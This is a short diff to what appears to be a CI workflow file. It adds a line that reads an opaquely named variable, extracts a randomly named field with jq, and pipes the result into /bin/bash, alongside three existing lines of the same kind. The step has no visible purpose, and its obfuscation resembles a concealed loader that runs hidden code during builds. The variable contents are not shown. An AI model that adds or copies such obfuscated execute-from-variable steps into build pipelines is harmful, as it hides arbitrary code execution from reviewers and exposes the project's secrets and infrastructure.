@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$x2287" | jq -r .yd4 | /bin/bash
           echo $ost53786 | jq -r .shz1 | /bin/bash
           echo $bjwv16278 | jq -r .p0 | /bin/bash
+          printf '%s' "$jqlx56519" | jq -r .k81 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
